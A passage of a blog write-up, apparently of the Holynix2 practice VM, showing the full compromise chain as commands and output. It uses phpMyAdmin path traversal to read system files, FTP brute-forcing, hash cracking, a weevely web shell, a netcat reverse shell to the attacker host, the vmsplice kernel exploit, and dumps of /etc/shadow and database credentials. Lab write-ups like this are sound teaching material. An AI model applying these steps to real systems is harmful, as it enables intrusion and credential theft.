+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
+</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
+</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
+</span><span class='line'>bind:x:104:111::/var/cache/bind:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false
+</span><span class='line'>lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
+</span><span class='line'>cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
+</span><span class='line'>ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
+</span><span class='line'>skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
+</span><span class='line'>amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
+</span><span class='line'>cmahong:x:1005:2002::/home/cmahong:/bin/false
+</span><span class='line'>lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false
+</span><span class='line'>jstreet:x:1007:2002::/home/jstreet:/bin/false
+</span><span class='line'>rwoo:x:1008:2002::/home/rwoo:/bin/false
+</span><span class='line'>kmccallum:x:1009:2002::/home/kmccallum:/bin/false
+</span><span class='line'>cjalong:x:1010:2002::/home/cjalong:/bin/false
+</span><span class='line'>jsmith:x:1011:2002::/home/jsmith:/bin/false
+</span><span class='line'>dhammond:x:1012:2002::/home/dhammond:/bin/false
+</span><span class='line'>hmcknight:x:1013:2002::/home/hmcknight:/bin/false
+</span><span class='line'>lwestre:x:1014:2002::/home/lwestre:/bin/false
+</span><span class='line'>gwelch:x:1015:2002::/home/gwelch:/bin/false
+</span><span class='line'>dmoran:x:1016:2002::/home/dmoran:/bin/false
+</span><span class='line'>dsummers:x:1017:2002::/home/dsummers:/bin/false
+</span><span class='line'>bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false
+</span><span class='line'>ncobol:x:1019:2002::/home/ncobol:/bin/false
+</span><span class='line'>ddypsky:x:1020:2002::/home/ddypsky:/bin/false
+</span><span class='line'>rcropper:x:1021:2002::/home/rcropper:/bin/false
+</span><span class='line'>cbergey:x:1022:2002::/home/cbergey:/bin/false
+</span><span class='line'>tmartin:x:1023:2002::/home/tmartin:/bin/false
+</span><span class='line'>jgacy:x:1024:2002::/home/jgacy:/bin/false
+</span><span class='line'>splath:x:1025:2002::/home/splath:/bin/false
+</span><span class='line'>evorhees:x:1026:2002::/home/evorhees:/bin/false
+</span><span class='line'>rfrost:x:1027:2002::/home/rfrost:/bin/false
+</span><span class='line'>ahuxley:x:1028:2002::/home/ahuxley:/bin/false
+</span><span class='line'>webmaster:x:1029:2002::/var/www:/bin/false
+</span><span class='line'>cmanson:x:1030:2002::/home/cmanson:/bin/false
+</span><span class='line'>vftp:x:1031:2002:Virtual FTP User:/dev/null:/bin/false</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/apache2/apache2.conf | grep -i log
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/conf/PureDB
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.pdb
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/init.d/firewall</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can also try to perform the brute-force attack on ftp users (see /etc/group)
+and generate the short wordlist with john according username, but without
+success, ftp connection is limited with the firewall:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# <span class="k">for</span> i in <span class="k">$(</span>cat ftp-users<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span> &gt; john-temp-wl <span class="p">;</span> john --wordlist<span class="o">=</span><span class="s2">&quot;john-temp-wl&quot;</span> --rules --stdout &gt; john-temp-wl-with-rules<span class="p">;</span> hydra -l <span class="nv">$i</span> -P john-temp-wl-with-rules 192.168.1.88 ftp -V -t <span class="m">1</span> -w 50<span class="p">;</span> <span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After a while we found the hash list for ftp and used the john to crack it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.passwd
+</span><span class='line'>
+</span><span class='line'>cmahong:$1$vUW5q3t0$9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
+</span><span class='line'>lnickerbacher:$1$yiEZKCE0$BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
+</span><span class='line'>jstreet:$1$sBGmOuB0$TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
+</span><span class='line'>rwoo:$1$VZxDrE30$p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
+</span><span class='line'>cfinnerly:$1$dRGyIOy0$OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
+</span><span class='line'>kmccallum:$1$dijBzwn0$qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
+</span><span class='line'>cjalong:$1$FVj4if60$BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
+</span><span class='line'>jsmith:$1$yQKaOpR0$UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
+</span><span class='line'>lsanderson:$1$gzIP52U0$cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
+</span><span class='line'>dhammond:$1$yK9OuzZ0$W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
+</span><span class='line'>hmcknight:$1$A07SpdB0$hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
+</span><span class='line'>lwestre:$1$.R5Dbl60$n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
+</span><span class='line'>gwelch:$1$/uYT22Y0$njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
+</span><span class='line'>dmoran:$1$JZrJXdU0$ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
+</span><span class='line'>dsummers:$1$VXo3pWp0$v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
+</span><span class='line'>bzimmerman:$1$rQep6B90$ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
+</span><span class='line'>amckinley:$1$45Bz0af0$Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
+</span><span class='line'>ncobol:$1$q.xxgp70$645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
+</span><span class='line'>ddypsky:$1$ccUhlpJ0$PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
+</span><span class='line'>rcropper:$1$Qhw2Vff0$QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
+</span><span class='line'>ddonnovan:$1$1z2APl80$uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
+</span><span class='line'>cbergey:$1$MOwY3Ie0$LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
+</span><span class='line'>tmartin:$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
+</span><span class='line'>jgacy:$1$b.0bYDi0$sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
+</span><span class='line'>splath:$1$jbdcsaj0$7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
+</span><span class='line'>skrymple:$1$zjyNa1C0$x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
+</span><span class='line'>evorhees:$1$ITHWZZd0$Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
+</span><span class='line'>rfrost:$1$3Nqexaj0$eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
+</span><span class='line'>ahuxley:$1$ObpCAT60$LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
+</span><span class='line'>cmanson:$1$gMHNCq70$RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
+</span><span class='line'>webmaster:$1$v2tdHOX0$MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john hashes.john --wordlist="/usr/share/wordlists/rockyou.txt"  --rules
+</span><span class='line'>millionaire      (tmartin)
+</span><span class='line'>chatterbox1      (cbergey)
+</span><span class='line'>bravenewworld    (ahuxley)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We uploaded weevely to web directory of tmartin user via ftp:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ftp> put weevely.php
+</span><span class='line'>local: weevely.php remote: weevely.php
+</span><span class='line'>200 PORT command successful
+</span><span class='line'>150 Connecting to port 49625
+</span><span class='line'>226-File successfully transferred
+</span><span class='line'>226 0.000 seconds (measured here), 1.87 Mbytes per second
+</span><span class='line'>610 bytes sent in 0.00 secs (29785.2 kB/s)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The kernel was vulnerable (vmsplice, 5092.c) and because weevely shell always
+logged out root user, we used reverse shell and the writable /dev/shm
+directory.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb/platforms/linux/local# nc -lvp 1337
+</span><span class='line'>listening on [any] 1337 ...
+</span><span class='line'>
+</span><span class='line'>www-data@:/dev/shm $ :backdoor.reversetcp 192.168.1.34 -port 1337 -vector netcat-bsd
+</span><span class='line'>[backdoor.reversetcp] [!] Error: Binding socket [Errno 98] Address already in use
+</span><span class='line'>
+</span><span class='line'>www-data@:/dev/shm $ :file.upload /usr/share/exploitdb/platforms/linux/local/5092 5092</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On our Kali Linux:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>connect to [192.168.1.34] from www.zincftp.com [192.168.1.88] 49100
+</span><span class='line'>/bin/sh: can't access tty; job control turned off
+</span><span class='line'>$ chmod +x 5092
+</span><span class='line'>$ ./5092
+</span><span class='line'>bash: no job control in this shell
+</span><span class='line'>root@holynix2:/dev/shm# cat /etc/shadow
+</span><span class='line'>root:$1$wMs1EClc$90lJ2ckB8jbibX.yrE7ac0:14949:0:99999:7:::
+</span><span class='line'>daemon:*:14949:0:99999:7:::
+</span><span class='line'>bin:*:14949:0:99999:7:::
+</span><span class='line'>sys:*:14949:0:99999:7:::
+</span><span class='line'>sync:*:14949:0:99999:7:::
+</span><span class='line'>games:*:14949:0:99999:7:::
+</span><span class='line'>man:*:14949:0:99999:7:::
+</span><span class='line'>lp:*:14949:0:99999:7:::
+</span><span class='line'>mail:*:14949:0:99999:7:::
+</span><span class='line'>news:*:14949:0:99999:7:::
+</span><span class='line'>uucp:*:14949:0:99999:7:::
+</span><span class='line'>proxy:*:14949:0:99999:7:::
+</span><span class='line'>www-data:*:14949:0:99999:7:::
+</span><span class='line'>backup:*:14949:0:99999:7:::
+</span><span class='line'>list:*:14949:0:99999:7:::
+</span><span class='line'>irc:*:14949:0:99999:7:::
+</span><span class='line'>gnats:*:14949:0:99999:7:::
+</span><span class='line'>nobody:*:14949:0:99999:7:::
+</span><span class='line'>libuuid:!:14949:0:99999:7:::
+</span><span class='line'>dhcp:*:14949:0:99999:7:::
+</span><span class='line'>syslog:*:14949:0:99999:7:::
+</span><span class='line'>klog:*:14949:0:99999:7:::
+</span><span class='line'>bind:*:14949:0:99999:7:::
+</span><span class='line'>sshd:*:14949:0:99999:7:::
+</span><span class='line'>mysql:!:14949:0:99999:7:::
+</span><span class='line'>lsanderson:$1$d1rHIv2m$301/2naFEYQbmjg/CJZbO0:14949:0:99999:7:::
+</span><span class='line'>cfinnerly:$1$7BPRHJcw$3W/9R.1BNqMJvvHWSa9jC/:14949:0:99999:7:::
+</span><span class='line'>ddonnovan:$1$.aIQOdgq$JnPLWS9ETJEmPvvMZFgqK.:14949:0:99999:7:::
+</span><span class='line'>skrymple:$1$nCenIeL7$3fq23HWXI1/cYX7q9FGVa0:14949:0:99999:7:::
+</span><span class='line'>amckinley:$1$cZn8zx7p$0oURMPJj4U9UM0XhmhQM71:14951:0:99999:7:::
+</span><span class='line'>cmahong:!:14949:0:99999:7:::
+</span><span class='line'>lnickerbacher:!:14949:0:99999:7:::
+</span><span class='line'>jstreet:!:14949:0:99999:7:::
+</span><span class='line'>rwoo:!:14949:0:99999:7:::
+</span><span class='line'>kmccallum:!:14949:0:99999:7:::
+</span><span class='line'>cjalong:!:14949:0:99999:7:::
+</span><span class='line'>jsmith:!:14949:0:99999:7:::
+</span><span class='line'>dhammond:!:14949:0:99999:7:::
+</span><span class='line'>hmcknight:!:14949:0:99999:7:::
+</span><span class='line'>lwestre:!:14949:0:99999:7:::
+</span><span class='line'>gwelch:!:14949:0:99999:7:::
+</span><span class='line'>dmoran:!:14949:0:99999:7:::
+</span><span class='line'>dsummers:!:14949:0:99999:7:::
+</span><span class='line'>bzimmerman:!:14949:0:99999:7:::
+</span><span class='line'>ncobol:!:14949:0:99999:7:::
+</span><span class='line'>ddypsky:!:14949:0:99999:7:::
+</span><span class='line'>rcropper:!:14949:0:99999:7:::
+</span><span class='line'>cbergey:!:14949:0:99999:7:::
+</span><span class='line'>tmartin:!:14949:0:99999:7:::
+</span><span class='line'>jgacy:!:14949:0:99999:7:::
+</span><span class='line'>splath:!:14949:0:99999:7:::
+</span><span class='line'>evorhees:!:14949:0:99999:7:::
+</span><span class='line'>rfrost:!:14949:0:99999:7:::
+</span><span class='line'>ahuxley:!:14949:0:99999:7:::
+</span><span class='line'>webmaster:!:14949:0:99999:7:::
+</span><span class='line'>cmanson:!:14949:0:99999:7:::
+</span><span class='line'>vftp:!:14949:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We also found:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@holynix2:/var/www/dev# cat dbconn.php
+</span><span class='line'>&lt;?php
+</span><span class='line'>        $db_host = 'localhost';
+</span><span class='line'>        $db_user = 'root';
+</span><span class='line'>        $db_pass = 'dynamo59956783';
+</span><span class='line'>        $db_name = '_zincftp_data';
+</span><span class='line'>        $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
+</span><span class='line'>        mysql_select_db($db_name,$conn) or die("Could not select Database");</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If there is not a vulnerable phpmyadmin, we can read the files to table too, according:</p>
+
+<p>1) zincftp_data ->  Create new table on database zincftp_data</p>
+
+<p>2) Name = ftp_pass, Number of fields = 1</p>
+
+<p>3) Field = pass, Type = varchar, Length = 100</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SQL Query Window:
+</span><span class='line'>
+</span><span class='line'>LOAD DATA LOCAL INFILE '/etc/pure-ftpd/pureftpd.passwd' INTO TABLE ftp_pass LINES TERMINATED BY '\n'</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/5">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/3">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Norbert Szetei -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
